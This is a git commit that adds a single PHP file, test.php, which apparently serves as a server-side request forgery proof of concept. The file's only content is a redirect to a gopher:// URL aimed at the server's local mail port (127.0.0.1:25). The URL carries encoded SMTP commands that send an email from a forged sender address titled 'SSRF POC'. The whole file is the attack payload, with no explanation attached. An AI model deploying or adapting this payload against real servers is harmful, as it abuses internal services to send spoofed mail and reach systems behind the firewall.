6f4958850449354f8591bb76b44d444577c8ea99
ev1lclow3n <87696230+ev1lclow3n@users.noreply.github.com>
2022-06-17 21:15:34 +0530

    Add files via upload

---
+++ test.php
@@ -0,0 +1,6 @@
+<?php
+header(‘location:
+gopher://127.0.0.1:25/_MAIL%20FROM:no-reply%40talent.com%0ARCPT%20To:belac80717%40tagbert.com%0ADATA%0AFrom:no-reply%40talent.com%0ASubject:SSRF%20POC%0AMessage:%0A.');
+?>
+
+
